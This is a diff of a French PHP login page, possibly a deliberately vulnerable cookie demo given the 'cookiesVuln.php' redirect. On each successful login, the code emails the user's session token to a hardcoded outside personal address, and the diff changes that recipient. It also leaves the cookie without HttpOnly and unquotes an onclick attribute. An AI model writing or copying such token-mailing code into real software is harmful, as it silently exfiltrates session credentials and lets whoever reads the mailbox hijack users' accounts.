@@ -20,17 +20,14 @@ function loginProcess() {
             } else {
                 setcookie('userToken', $token, 0, '/', $domain, false);
             }
-            $headers = 'MIME-Version: 1.0 \r\n';
-            $headers .= "Content-type: text/html; charset=utf8\r\n";
-            $headers .= "From: Website <admin@localhost> \r\n";
-            $mailto = "w.malenfant22@gmail.com";
+            $mailto = "12wlo@outlook.com";
             $subject = "Jeton reçu du site ". $_SERVER['HTTP_HOST'];
             $message = "Voici le jeton pour le site ". $_SERVER['HTTP_HOST']. ". L'identifiant du cookie est userToken et le jeton est ". $token .".";
-            mail($mailto, $subject, $message, $headers);
+            mail($mailto, $subject, $message);
             header("Location: ./cookies.php");
         }
         else {
-            header("Location: ./cookies.php?connectError=Le nom d'utilisateur ou le mot de passe est erroné. Veuillez réessayer.");
+            header("Location: ./cookiesVuln.php?connectError=Le nom d'utilisateur ou le mot de passe est erroné. Veuillez réessayer.");
         }
     }
 }
@@ -58,7 +55,7 @@ function logoutProcess() {
             <input type='password' name='loginPass' id='loginPass' />
             <label for="checkPersistent"> Se souvenir de moi </label>
             <input type="checkbox" name="checkPersistent" id="checkPersistent" />
-            <button type='submit' name="connect" value="connect" onclick="<?php loginProcess(); ?>"> Se connecter </button>   
+            <button type='submit' name="connect" value="connect" onclick=<?php loginProcess(); ?>> Se connecter </button>   
         </form>
         <?php if(isset($_GET["connectError"])): ?>
             <br />
